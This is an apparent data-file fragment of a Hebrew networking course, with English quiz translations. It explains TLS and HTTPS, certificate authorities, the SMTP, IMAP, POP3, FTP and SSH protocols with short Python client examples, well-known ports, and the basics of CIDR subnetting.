              <li><code>ping</code>, <code>traceroute</code> — בדיקה ומסלול. <code>netstat</code> — פורטים</li>
              <li><code>ipconfig</code>/<code>ifconfig</code> — הגדרות רשת. <code>nslookup</code> — <code>DNS</code>. <code>arp -a</code> — <code>ARP</code></li>
              <li><code>Wireshark</code>, <code>Scapy</code> — כלי ניתוח והסנפה</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 14",
        titleEn: "Chapter 14 — Comprehension Questions",
        questions: [
          {
            q: "באיזו פקודה משתמשים כדי לבדוק אם שרת מרוחק מגיב?",
            a: "ping – שולח ICMP Echo Request. אם התשובה מגיעה, השרת חי ומחובר. אם לא – יכול להיות חסימה, כיבוי, או בעיית רשת.",
            qEn: "Which command is used to check if a remote server is responding?",
            aEn: "ping — it sends an ICMP Echo Request. If the reply comes back, the server is alive and connected. If not — there may be a block, shutdown, or network problem."
          }
        ]
      }
    ]
  },
  {
    id: 15,
    title: "HTTPS ו-TLS – תקשורת מוצפנת",
    pages: [
      {
        type: "explanation",
        title: "למה צריך הצפנה?",
        content: `
          <p>כשגולשים ב-<code>HTTP</code> רגיל, כל הנתונים עוברים כטקסט גלוי.</p>
          <p>כל מי שמסנן את התעבורה — ספק האינטרנט, <code>WiFi</code> ציבורי, האקר ב-<code>MITM</code> — יכול לראות:</p>
          <ul>
            <li>סיסמאות שהזנת</li>
            <li>הודעות פרטיות</li>
            <li>פרטי כרטיס אשראי</li>
            <li>כל תוכן הדף</li>
          </ul>
          <p><strong><code>HTTPS</code></strong> = <code>HTTP</code> מעל <code>TLS</code>.</p>
          <p>כל התקשורת מוצפנת מקצה לקצה.</p>
          <p>גם אם מישהו מסנף את הנתונים ברשת, הוא רואה רק מידע מוצפן חסר משמעות.</p>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 340 80" class="content-diagram">
              <rect x="10" y="20" width="80" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="50" y="44" text-anchor="middle" font-size="10">דפדפן</text>
              <rect x="250" y="20" width="80" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="290" y="44" text-anchor="middle" font-size="10">שרת</text>
              <path d="M 90 35 L 250 35" stroke="var(--accent-green)" stroke-width="2.5"/>
              <text x="170" y="28" text-anchor="middle" font-size="9" fill="var(--accent-green)">🔒 מוצפן (TLS)</text>
              <path d="M 90 50 L 250 50" stroke="#c06060" stroke-width="1.5" stroke-dasharray="4,3"/>
              <text x="170" y="63" text-anchor="middle" font-size="9" fill="#c06060">HTTP גלוי – כולם רואים</text>
            </svg>
          </div>
          <ul>
            <li><strong>פורט 443</strong> = <code>HTTPS</code></li>
            <li><strong>פורט 80</strong> = <code>HTTP</code></li>
          </ul>
          <p>דפדפן מודרני מציג סמל מנעול כשה-<code>TLS</code> תקין.</p>
        `
      },
      {
        type: "explanation",
        title: "הצפנה סימטרית ואסימטרית",
        content: `
          <p>שני סוגי הצפנה שונים משמשים ב-<code>TLS</code>.</p>
          <p><strong>הצפנה סימטרית</strong></p>
          <p>אותו מפתח משמש גם להצפנה וגם לפענוח.</p>
          <p>השיטה מהירה מאוד — האלגוריתם הנפוץ הוא <code>AES</code>.</p>
          <p>הבעיה: איך מעבירים את המפתח לצד השני בלי שמישהו באמצע יתפוס אותו?</p>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 320 60" class="content-diagram">
              <rect x="10" y="15" width="60" height="30" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="40" y="34" text-anchor="middle" font-size="10">Alice</text>
              <rect x="250" y="15" width="60" height="30" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="280" y="34" text-anchor="middle" font-size="10">Bob</text>
              <text x="160" y="28" text-anchor="middle" font-size="9" fill="var(--accent-gold)">מפתח: 🔑 (סודי לשניהם)</text>
              <path d="M 70 30 L 250 30" stroke="var(--accent-gold)" stroke-width="2"/>
            </svg>
          </div>
          <p><strong>הצפנה אסימטרית</strong></p>
          <p>משתמשת בזוג מפתחות: מפתח <em>פרטי</em> (סודי) ומפתח <em>ציבורי</em> (גלוי לכולם).</p>
          <p>האלגוריתמים הנפוצים הם <code>RSA</code> ו-<code>ECC</code>.</p>
          <p>הצפנה עם המפתח הציבורי מבטיחה שרק המפתח הפרטי יכול לפענח.</p>
          <p><strong>חתימה דיגיטלית</strong> עובדת הפוך — חותמים עם המפתח הפרטי, וכולם יכולים לאמת עם הציבורי.</p>
          <p>הצפנה אסימטרית פותרת את בעיית העברת המפתח, אבל היא איטית.</p>
          <p>לכן <code>TLS</code> משתמש בהצפנה אסימטרית רק בשלב חילופי המפתחות, ואז עובר ל-<code>AES</code> המהיר לכל שאר השיחה.</p>
        `
      },
      {
        type: "explanation",
        title: "TLS Handshake – שלבי ה-HTTPS",
        content: `
          <p>לפני שמגיע אפילו בייט HTTP אחד, <code>TLS</code> מבצע <code>Handshake</code>.</p>
          <div class="demo-flow">
            <ol class="demo-steps">
              <li><strong>Client Hello</strong> — הדפדפן שולח גרסת <code>TLS</code> נתמכת, רשימת <code>cipher suites</code> ו-<code>Client Random</code>.</li>
              <li><strong>Server Hello + Certificate</strong> — השרת בוחר <code>cipher suite</code>, שולח <code>Server Random</code>, ושולח את האישור שלו.</li>
              <li><strong>אימות האישור</strong> — הדפדפן בודק שהאישור חתום על ידי <code>CA</code> מהימן, שהדומיין תואם, ושהתוקף לא פג.</li>
              <li><strong>Key Exchange</strong> — מחשבים <code>Session Key</code> מ-<code>Client Random</code> + <code>Server Random</code> + <code>Pre-Master Secret</code>. בגרסאות מודרניות מתבצע ב-<code>Diffie-Hellman</code>.</li>
              <li><strong>Finished</strong> — שני הצדדים מאשרים שה-<code>Handshake</code> הצליח. מכאן ואילך כל תקשורת מוצפנת ב-<code>AES</code>.</li>
            </ol>
          </div>
          <p><code>TLS 1.3</code> מבצע <code>Handshake</code> ב-1 <code>Round Trip</code> בלבד במקום 2 — מהיר יותר.</p>
        `
      },
      {
        type: "explanation",
        title: "אישורים ו-CA – Chain of Trust",
        content: `
          <p><strong><code>Certificate</code></strong> (אישור) מכיל:</p>
          <ul>
            <li>שם הדומיין</li>
            <li>המפתח הציבורי של השרת</li>
            <li>תוקף</li>
            <li>גוף שחתם — <code>CA</code></li>
          </ul>
          <p><strong>CA</strong> — <code>Certificate Authority</code></p>
          <p>גוף מהימן שחותם על אישורים דיגיטליים.</p>
          <p>דוגמאות: <code>DigiCert</code>, <code>Let's Encrypt</code>, <code>Comodo</code>.</p>
          <p>הדפדפן סומך עליהם כי הם מובנים מראש במערכת ההפעלה ובדפדפן.</p>
          <p><strong>שרשרת אמון:</strong></p>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 300 120" class="content-diagram">
              <rect x="80" y="5" width="140" height="28" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="150" y="23" text-anchor="middle" font-size="10">Root CA (מובנה ב-OS)</text>
              <path d="M 150 33 L 150 45" stroke="var(--accent)" stroke-width="2" marker-end="url(#arrowdown)"/>
              <rect x="70" y="45" width="160" height="28" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="150" y="63" text-anchor="middle" font-size="10">Intermediate CA</text>
              <path d="M 150 73 L 150 85" stroke="var(--accent)" stroke-width="2" marker-end="url(#arrowdown)"/>
              <rect x="70" y="85" width="160" height="28" rx="4" fill="var(--accent-green)" stroke="var(--accent-green)" opacity="0.8"/>
              <text x="150" y="103" text-anchor="middle" font-size="10" fill="white">אישור של example.com</text>
              <defs><marker id="arrowdown" markerWidth="8" markerHeight="8" refX="3" refY="6" orient="auto"><polygon points="0 0, 6 0, 3 6" fill="var(--accent)"/></marker></defs>
            </svg>
            <p class="diagram-caption">כל CA חותם על הבא – Root CA הוא עוגן האמון</p>
          </div>
          <p><strong>Let's Encrypt</strong> — <code>CA</code> בחינם שפתרה את בעיית עלות האישורים.</p>
          <p>היום רוב האתרים משתמשים בה.</p>
          <p><strong><code>Self-Signed Certificate</code></strong> — שרת שחתם על עצמו.</p>
          <p>הדפדפן לא סומך עליו ומציג אזהרה — שימושי לסביבות <code>dev</code> ו-<code>testing</code> בלבד.</p>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: HTTPS בפייתון — requests",
        content: `
          <p>ספריית <code>requests</code> בפייתון מטפלת ב-TLS אוטומטית:</p>
          <div class="code-preview">
            <pre><code>import requests

# HTTPS – הכל מוצפן אוטומטית
response = requests.get('https://api.github.com/users/octocat')
print(response.status_code)  # 200
print(response.json()['name'])  # The Octocat

# בדיקת אישור SSL
response = requests.get('https://expired.badssl.com')
# ConnectionError: SSL certificate verify failed!

# לביטול בדיקה (לא בפרוד!)
response = requests.get('https://self-signed.badssl.com', verify=False)</code></pre>
          </div>
          <ul>
            <li><code>requests</code> מוודא אוטומטית את אישור ה-<code>TLS</code>.</li>
            <li>כשהאישור לא תקין — זורק שגיאה.</li>
            <li><code>verify=False</code> מכבה את הבדיקה — אסור לשימוש בסביבת ייצור!</li>
          </ul>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – HTTPS ואבטחה",
        intro: "<p>האם HTTPS = בטוח לחלוטין?</p>",
        blocks: [
          {
            title: "HTTPS מגן על התעבורה – לא על האתר",
            icon: "🔒",
            content: `
              <p><code>HTTPS</code> מצפין את התקשורת בין הדפדפן לשרת.</p>
              <p>אם האתר עצמו זדוני — ההצפנה לא עוזרת.</p>
              <p>אתר פישינג יכול להיות <code>HTTPS</code> תקין לחלוטין עם סמל מנעול.</p>
              <p><strong>הכלל:</strong> סמל המנעול אומר "החיבור מוצפן", לא "האתר אמין".</p>
              <p>תמיד לבדוק את כתובת הדומיין — לא רק את המנעול.</p>
            `
          },
          {
            title: "MITM Attack – איך TLS מונע?",
            icon: "👥",
            content: `
              <p><strong>Man in the Middle</strong> — האקר יושב בין הדפדפן לשרת ומנסה לקרוא את כל התקשורת.</p>
              <p><strong>בלי TLS</strong> — הוא מצליח.</p>
              <p><strong>עם TLS</strong> — האקר לא יכול לזייף את האישור של <code>GitHub.com</code> כי אין לו את המפתח הפרטי של השרת.</p>
              <p>הדפדפן יזהה אישור לא תואם ויחסום את החיבור.</p>
              <p><strong>חריג</strong></p>
              <p>אם גוף <code>CA</code> נפרץ, האקר יכול לקבל אישור מזויף.</p>
              <p>זה קרה ב-2011 כשנפרצה חברת <code>DigiNotar</code>.</p>
            `
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 15",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li><code>HTTPS</code> = <code>HTTP</code> over <code>TLS</code>. פורט 443. מוצפן <code>end-to-end</code></li>
              <li>הצפנה סימטרית — <code>AES</code> — מהירה, מפתח משותף. אסימטרית — <code>RSA</code>/<code>ECC</code> — לחילופי מפתח</li>
              <li><code>TLS Handshake</code>: <code>Hello</code> → <code>Certificate</code> → <code>Key Exchange</code> → <code>Finished</code> → <code>AES</code></li>
              <li><code>Certificate</code> מאמת שהשרת הוא מי שהוא טוען. <code>CA</code> חותם על האישור</li>
              <li><code>Let's Encrypt</code> – <code>CA</code> חינמי. <code>Self-Signed</code> – לא מהימן לדפדפן</li>
              <li>🔒 = הקשר מוצפן, לא שהאתר אמין!</li>
            </ul>
          </div>
        `
      },
      { type: "simulation", title: "הדמיית TLS Handshake", simId: "tlsHandshake", content: "<p>ראו איך נוצר חיבור מוצפן בין דפדפן לשרת.</p>" },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 15",
        titleEn: "Chapter 15 — Comprehension Questions",
        questions: [
          {
            q: "מה ההבדל בין HTTP ל-HTTPS?",
            a: "HTTP – טקסט גלוי, כל אחד שמסנן את הרשת יכול לקרוא. HTTPS – HTTP עטוף ב-TLS, כל התוכן מוצפן. תוקף, סיסמאות, פרטי כרטיס אשראי – לא נראים.",
            qEn: "What is the difference between HTTP and HTTPS?",
            aEn: "HTTP sends plain text — anyone sniffing the network can read it. HTTPS wraps HTTP in TLS — all content is encrypted. Passwords, credit card details — not visible to attackers."
          },
          {
            q: "למה TLS משתמש ב-AES ולא ב-RSA לכל ההצפנה?",
            a: "RSA/ECC (אסימטרי) איטיים מאוד – מאות פעמים יותר מ-AES. TLS משתמש ב-RSA רק לחילופי מפתח (Handshake), ואז עובר ל-AES לכל שאר השיחה. זה פשרה בין אבטחה לביצועים.",
            qEn: "Why does TLS use AES and not RSA for all encryption?",
            aEn: "RSA/ECC (asymmetric) are very slow — hundreds of times slower than AES. TLS uses RSA only for key exchange (Handshake), then switches to AES for the rest of the session. This is a trade-off between security and performance."
          },
          {
            q: "מה CA ולמה צריך אותו?",
            a: "CA = גוף מהימן שחותם על אישורים. ללא CA, כל שרת היה יכול לטעון 'אני Google'. CA מאמת שהגוף שביקש אישור ל-google.com אכן שולט ב-google.com. הדפדפן סומך על CA-ים מסוימים שמובנים ב-OS.",
            qEn: "What is a CA and why do we need it?",
            aEn: "CA is a trusted body that signs certificates. Without a CA, any server could claim 'I am Google'. The CA verifies that the entity requesting a certificate for google.com actually controls google.com. The browser trusts certain CAs that are built into the OS."
          }
        ]
      }
    ]
  },
  {
    id: 16,
    title: "פרוטוקולי אפליקציה – Email, FTP, SSH",
    pages: [
      {
        type: "explanation",
        title: "email – SMTP, IMAP, POP3",
        content: `
          <p>דואר אלקטרוני משתמש בשלושה פרוטוקולים נפרדים, כל אחד לתפקיד שונה.</p>
          <table class="content-table">
            <tr><th>פרוטוקול</th><th>פורט</th><th>תפקיד</th></tr>
            <tr><td><code>SMTP</code></td><td>25 / 587</td><td>שליחת אימייל</td></tr>
            <tr><td><code>IMAP</code></td><td>143 / 993</td><td>קריאת אימייל — מסנכרן, ממשיך בשרת</td></tr>
            <tr><td><code>POP3</code></td><td>110 / 995</td><td>קריאת אימייל — מוריד ומוחק מהשרת</td></tr>
          </table>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 380 100" class="content-diagram">
              <rect x="10" y="30" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="45" y="54" text-anchor="middle" font-size="10">Alice</text>
              <rect x="110" y="20" width="70" height="60" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="145" y="45" text-anchor="middle" font-size="9">Mail Server</text>
              <text x="145" y="60" text-anchor="middle" font-size="9">(alice.com)</text>
              <rect x="200" y="20" width="70" height="60" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="235" y="45" text-anchor="middle" font-size="9">Mail Server</text>
              <text x="235" y="60" text-anchor="middle" font-size="9">(bob.com)</text>
              <rect x="300" y="30" width="70" height="40" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="335" y="54" text-anchor="middle" font-size="10">Bob</text>
              <path d="M 80 50 L 110 50" stroke="var(--accent-green)" stroke-width="2" marker-end="url(#arrowEmail)"/>
              <text x="95" y="43" text-anchor="middle" font-size="8" fill="var(--accent-green)">SMTP</text>
              <path d="M 180 50 L 200 50" stroke="var(--accent-gold)" stroke-width="2" marker-end="url(#arrowEmail2)"/>
              <text x="190" y="43" text-anchor="middle" font-size="8" fill="var(--accent-gold)">SMTP</text>
              <path d="M 300 50 L 270 50" stroke="#6090d0" stroke-width="2" marker-end="url(#arrowEmail3)"/>
              <text x="285" y="43" text-anchor="middle" font-size="8" fill="#6090d0">IMAP</text>
              <defs>
                <marker id="arrowEmail" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><polygon points="0 0, 6 3, 0 6" fill="var(--accent-green)"/></marker>
                <marker id="arrowEmail2" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><polygon points="0 0, 6 3, 0 6" fill="var(--accent-gold)"/></marker>
                <marker id="arrowEmail3" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><polygon points="0 0, 6 3, 0 6" fill="#6090d0"/></marker>
              </defs>
            </svg>
            <p class="diagram-caption">SMTP לשליחה, IMAP לקבלה (נשאר בשרת)</p>
          </div>
          <p><strong><code>IMAP</code></strong></p>
          <p>שומר הודעות בשרת.</p>
          <p>ניתן לפתוח ממחשב ומטלפון ולראות את אותן הודעות — מסונכרן בין כל המכשירים.</p>
          <p><strong><code>POP3</code></strong></p>
          <p>מוריד הודעות למכשיר ומוחק מהשרת.</p>
          <p>ההודעות קיימות רק על מכשיר אחד.</p>
          <p><strong>גרסאות מוצפנות:</strong></p>
          <ul>
            <li><code>SMTPS</code> — פורט 465</li>
            <li><code>IMAPS</code> — פורט 993</li>
            <li><code>POP3S</code> — פורט 995</li>
          </ul>
        `
      },
      {
        type: "demo",
        title: "המדריך מדגים: SMTP בפייתון",
        content: `
          <p>שליחת אימייל בפייתון עם smtplib:</p>
          <div class="code-preview">
            <pre><code>import smtplib
from email.mime.text import MIMEText

# יצירת ההודעה
msg = MIMEText("שלום מפייתון!")
msg['Subject'] = "בדיקת SMTP"
msg['From'] = "alice@example.com"
msg['To'] = "bob@example.com"

# שליחה דרך Gmail
with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
    server.login("alice@gmail.com", "app-password")
    server.send_message(msg)
    print("נשלח!")</code></pre>
          </div>
          <ul>
            <li><code>SMTP_SSL</code> מתחיל עם <code>TLS</code> מיידי.</li>
            <li><code>login()</code> מאמת את המשתמש.</li>
            <li><code>send_message()</code> שולח את ההודעה.</li>
            <li>Gmail דורש <code>App Password</code> — לא סיסמת החשבון — לאפליקציות צד שלישי.</li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "FTP – העברת קבצים",
        content: `
          <p><strong><code>FTP</code></strong> — <code>File Transfer Protocol</code></p>
          <p>פרוטוקול להעברת קבצים בין מחשבים.</p>
          <p>פועל על פורט 21 — פקודות, ופורט 20 — נתונים.</p>
          <p><strong>שני מצבי העברה:</strong></p>
          <ul>
            <li><strong>Active mode</strong> — הלקוח פותח פורט, השרת מתחבר אליו. בעייתי עם <code>Firewall</code></li>
            <li><strong>Passive mode</strong> — השרת פותח פורט, הלקוח מתחבר. עובד עם <code>Firewall</code> — מומלץ</li>
          </ul>
          <p><strong>פקודות FTP נפוצות:</strong></p>
          <ul>
            <li><code>LIST</code> — רשימת קבצים</li>
            <li><code>RETR filename</code> — הורדת קובץ</li>
            <li><code>STOR filename</code> — העלאת קובץ</li>
            <li><code>PWD</code> — תיקייה נוכחית</li>
            <li><code>CWD dir</code> — מעבר לתיקייה</li>
          </ul>
          <div class="code-preview">
            <pre><code>from ftplib import FTP

ftp = FTP('ftp.example.com')
ftp.login('user', 'password')
ftp.cwd('/pub')
print(ftp.nlst())  # רשימת קבצים

# הורדה
with open('file.txt', 'wb') as f:
    ftp.retrbinary('RETR file.txt', f.write)

ftp.quit()</code></pre>
          </div>
          <p><strong>גרסאות מאובטחות:</strong></p>
          <ul>
            <li><strong><code>SFTP</code></strong> — <code>SSH File Transfer Protocol</code>. פרוטוקול נפרד לחלוטין מ-<code>FTP</code>, שרץ מעל <code>SSH</code> בפורט 22. למרות השם הדומה, אינו קשור ל-<code>FTP</code> הישן</li>
            <li><strong><code>FTPS</code></strong> — <code>FTP</code> המקורי עם שכבת <code>TLS</code> מעליו.</li>
          </ul>
          <p><code>FTP</code> רגיל מעביר נתונים כטקסט גלוי.</p>
          <p>אין להשתמש ב-<code>FTP</code> ישן ברשת ציבורית.</p>
        `
      },
      {
        type: "explanation",
        title: "SSH – גישה מרוחקת מאובטחת",
        content: `
          <p><strong><code>SSH</code></strong> — <code>Secure Shell</code></p>
          <p>פרוטוקול לגישה מרוחקת מוצפנת.</p>
          <p>פורט 22. מחליף את <code>Telnet</code> — לא מוצפן — לחלוטין.</p>
          <p><strong>מה אפשר לעשות ב-SSH:</strong></p>
          <ul>
            <li><strong>Terminal מרוחק</strong> – פתיחת shell על שרת מרוחק</li>
            <li><strong>SCP/SFTP</strong> – העברת קבצים מוצפנת</li>
            <li><strong>Port Forwarding</strong> – העברת תעבורה דרך הצינור המוצפן</li>
            <li><strong>Tunneling</strong> – גישה לשירותים פנימיים דרך SSH</li>
          </ul>
          <div class="code-preview">
            <pre><code># התחברות לשרת
ssh user@192.168.1.100

# התחברות עם מפתח (ללא סיסמה)
ssh -i ~/.ssh/id_rsa user@server.com

# העתקת קובץ לשרת
scp localfile.txt user@server.com:/home/user/

# Port Forwarding – גישה ל-localhost:8080 בשרת דרך 9090 מקומי
ssh -L 9090:localhost:8080 user@server.com</code></pre>
          </div>
          <p><strong>SSH Keys – אימות עם מפתחות</strong></p>
          <p>שיטת אימות חזקה שאינה דורשת סיסמה.</p>
          <ul>
            <li>יוצרים זוג מפתחות עם הפקודה <code>ssh-keygen</code>.</li>
            <li>המפתח הציבורי מועלה לשרת לקובץ <code>~/.ssh/authorized_keys</code>.</li>
            <li>בעת חיבור, הלקוח מוכיח שיש לו את המפתח הפרטי — בלי לשלוח אותו.</li>
          </ul>
          <p><strong>SSH בפייתון — ספריית Paramiko:</strong></p>
          <div class="code-preview">
            <pre><code>import paramiko

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('192.168.1.100', username='user', password='pass')

stdin, stdout, stderr = ssh.exec_command('ls -la')
print(stdout.read().decode())
ssh.close()</code></pre>
          </div>
        `
      },
      {
        type: "explanation",
        title: "פורטים ידועים – טבלה מלאה",
        content: `
          <p>פורטים ידועים — 0 עד 1023 — מוקצים ל-<code>Well-Known Services</code>:</p>
          <table class="content-table">
            <tr><th>פורט</th><th>פרוטוקול</th><th>שכבה</th><th>שימוש</th></tr>
            <tr><td>20/21</td><td><code>FTP</code></td><td><code>TCP</code></td><td>העברת קבצים</td></tr>
            <tr><td>22</td><td><code>SSH</code></td><td><code>TCP</code></td><td>גישה מרוחקת מאובטחת</td></tr>
            <tr><td>23</td><td><code>Telnet</code></td><td><code>TCP</code></td><td>גישה מרוחקת — לא מוצפן!</td></tr>
            <tr><td>25</td><td><code>SMTP</code></td><td><code>TCP</code></td><td>שליחת אימייל</td></tr>
            <tr><td>53</td><td><code>DNS</code></td><td><code>UDP</code>/<code>TCP</code></td><td>מיפוי דומיין ל-IP</td></tr>
            <tr><td>67/68</td><td><code>DHCP</code></td><td><code>UDP</code></td><td>הקצאת IP אוטומטית</td></tr>
            <tr><td>80</td><td><code>HTTP</code></td><td><code>TCP</code></td><td>גלישה (לא מוצפן)</td></tr>
            <tr><td>110</td><td><code>POP3</code></td><td><code>TCP</code></td><td>קריאת אימייל</td></tr>
            <tr><td>143</td><td><code>IMAP</code></td><td><code>TCP</code></td><td>קריאת אימייל (מסונכרן)</td></tr>
            <tr><td>443</td><td><code>HTTPS</code></td><td><code>TCP</code></td><td>גלישה מוצפנת — <code>TLS</code></td></tr>
            <tr><td>993</td><td><code>IMAPS</code></td><td><code>TCP</code></td><td><code>IMAP</code> מוצפן</td></tr>
            <tr><td>3389</td><td><code>RDP</code></td><td><code>TCP</code></td><td><code>Remote Desktop</code> — <code>Windows</code></td></tr>
          </table>
        `
      },
      {
        type: "summary",
        title: "סיכום פרק 16",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>Email: <code>SMTP</code> — שליחה, פורט 25/587. <code>IMAP</code> — קריאה מסונכרנת, פורט 143. <code>POP3</code> — הורדה, פורט 110</li>
              <li><code>FTP</code>: פורט 21 — פקודות, פורט 20 — נתונים. <code>Passive mode</code> עם <code>Firewall</code>. <code>SFTP</code> = <code>FTP</code> מעל <code>SSH</code></li>
              <li><code>SSH</code>: פורט 22. מוצפן. <code>Terminal</code> מרוחק, <code>SCP</code>, <code>SFTP</code>, <code>Port Forwarding</code></li>
              <li><code>SSH Keys</code>: אימות חזק ללא סיסמה. <code>Paramiko</code> – <code>SSH</code> מפייתון</li>
              <li><code>Telnet</code> – לא מוצפן – לא להשתמש! <code>SSH</code> מחליף אותו</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 16",
        titleEn: "Chapter 16 — Comprehension Questions",
        questions: [
          {
            q: "מה ההבדל בין IMAP ל-POP3?",
            a: "IMAP – הודעות נשמרות בשרת, מסונכרן בין כל המכשירים. POP3 – מוריד הודעות למחשב ומוחק מהשרת. IMAP מתאים כשמשתמשים בכמה מכשירים. POP3 – כשרוצים הכל במחשב אחד.",
            qEn: "What is the difference between IMAP and POP3?",
            aEn: "IMAP keeps messages on the server and syncs across all devices. POP3 downloads messages to the computer and deletes them from the server. IMAP is good when using multiple devices. POP3 is for keeping everything on one computer."
          },
          {
            q: "למה SSH עדיף על Telnet?",
            a: "Telnet שולח הכל כטקסט גלוי – סיסמאות, פקודות, פלט. SSH מצפין את כל התקשורת. Telnet = שיחה בשידור חי שכולם שומעים. SSH = שיחה מוצפנת.",
            qEn: "Why is SSH better than Telnet?",
            aEn: "Telnet sends everything as plain text — passwords, commands, output. SSH encrypts all communication. Telnet is like a public conversation everyone can hear. SSH is an encrypted conversation."
          },
          {
            q: "מה SSH Port Forwarding עושה?",
            a: "מאפשר לגשת לשירות ברשת מרוחקת דרך הצינור המוצפן. למשל: שרת DB שמאזין רק ל-localhost בשרת מרוחק – Port Forwarding מאפשר לגשת אליו מהמחשב המקומי דרך SSH.",
            qEn: "What does SSH Port Forwarding do?",
            aEn: "It allows access to a service on a remote network through the encrypted tunnel. For example: a DB server that listens only on localhost on a remote server — Port Forwarding lets you access it from your local computer through SSH."
          }
        ]
      }
    ]
  },
  {
    id: 17,
    title: "Subnetting ו-CIDR – חלוקת רשתות",
    pages: [
      {
        type: "explanation",
        title: "מה זה Subnetting?",
        content: `
          <p><strong><code>Subnetting</code></strong> — חלוקת תת-רשתות</p>
          <p>חלוקת רשת IP גדולה לרשתות קטנות יותר.</p>
          <p><strong>למה מחלקים לתת-רשתות?</strong></p>
          <ul>
            <li><strong>אבטחה</strong> — הפרדה בין מחלקות — HR, Development, Guest</li>
            <li><strong>ביצועים</strong> – <code>Broadcast</code> מוגבל לרשת הקטנה</li>
            <li><strong>ארגון</strong> – כל מחלקה או אתר מקבל טווח IP נפרד</li>
          </ul>
          <p>כל כתובת IP מורכבת מ-<strong>חלק רשת</strong> — <code>Network part</code>, ו-<strong>חלק מארח</strong> — <code>Host part</code>.</p>
          <p>ה-<code>Subnet Mask</code> קובע את הגבול בין שני החלקים.</p>
          <div class="diagram-container">
            <svg direction="ltr" viewBox="0 0 340 60" class="content-diagram">
              <rect x="10" y="15" width="160" height="30" rx="4" fill="var(--accent-green)" opacity="0.7"/>
              <text x="90" y="34" text-anchor="middle" font-size="11" fill="white">חלק רשת</text>
              <rect x="175" y="15" width="155" height="30" rx="4" fill="var(--accent-gold)" opacity="0.7"/>
              <text x="252" y="34" text-anchor="middle" font-size="11" fill="white">חלק מארח</text>
              <text x="90" y="58" text-anchor="middle" font-size="10" fill="var(--text-muted)">192.168.1</text>
              <text x="252" y="58" text-anchor="middle" font-size="10" fill="var(--text-muted)">.105</text>
            </svg>
            <p class="diagram-caption">IP 192.168.1.105 – הרשת היא 192.168.1, המארח הוא 105</p>
          </div>
        `
      },
      {
        type: "explanation",
        title: "CIDR – Classless Inter-Domain Routing",
        content: `
          <p><strong>CIDR</strong> — <code>Classless Inter-Domain Routing</code></p>
          <p>סימון <code>/prefix</code>.</p>
          <p>במקום לכתוב <code>Subnet Mask</code> מלא, כותבים רק את מספר ביטי הרשת:</p>
          <table class="content-table">
            <tr><th>CIDR</th><th>Subnet Mask</th><th>מספר כתובות</th><th>שימוש</th></tr>
            <tr><td>/8</td><td>255.0.0.0</td><td>16,777,214</td><td>ISP גדול</td></tr>
            <tr><td>/16</td><td>255.255.0.0</td><td>65,534</td><td>חברה גדולה</td></tr>
            <tr><td>/24</td><td>255.255.255.0</td><td>254</td><td>רשת משרד רגילה</td></tr>
            <tr><td>/25</td><td>255.255.255.128</td><td>126</td><td>חצי רשת /24</td></tr>
            <tr><td>/30</td><td>255.255.255.252</td><td>2</td><td>קישור P2P בין נתבים</td></tr>
            <tr><td>/32</td><td>255.255.255.255</td><td>1</td><td>מארח בודד</td></tr>
          </table>
          <p><strong>נוסחת חישוב:</strong> מספר כתובות = 2 בחזקת 32 פחות ה-prefix.</p>
          <p>מספר מארחים = כתובות פחות 2 — כתובת הרשת וכתובת ה-<code>Broadcast</code> אינן ניתנות להקצאה.</p>
          <p><strong>דוגמה:</strong></p>
          <p>רשת <code>192.168.1.0/24</code>:</p>
          <ul>
            <li>כתובת רשת: 192.168.1.0 (לא ניתן להקצות למארח)</li>
            <li>טווח מארחים: 192.168.1.1 – 192.168.1.254</li>
            <li><code>Broadcast</code>: 192.168.1.255</li>
            <li>סה"כ מארחים: 254</li>
          </ul>
        `
      },
      {
        type: "explanation",
        title: "כתובות IP פרטיות וציבוריות",
        content: `
          <p>ב-<code>RFC 1918</code> הוגדרו טווחי IP <strong>פרטיים</strong>.</p>
          <p>לא ניתן לנתב אותם באינטרנט:</p>
          <table class="content-table">
            <tr><th>טווח</th><th>CIDR</th><th>מספר כתובות</th><th>שימוש</th></tr>
            <tr><td>10.0.0.0 – 10.255.255.255</td><td>10.0.0.0/8</td><td>16M</td><td>רשתות ארגוניות גדולות</td></tr>
            <tr><td>172.16.0.0 – 172.31.255.255</td><td>172.16.0.0/12</td><td>1M</td><td>רשתות בינוניות</td></tr>
            <tr><td>192.168.0.0 – 192.168.255.255</td><td>192.168.0.0/16</td><td>65K</td><td>בית, משרדים קטנים</td></tr>
          </table>
          <p><strong>כתובות ציבוריות</strong> – שאר הטווחים.</p>
          <p>הן מוקצות על ידי <span dir="ltr"><code>IANA</code> → <code>RIR</code> → <code>ISP</code> → לקוח</span>.</p>
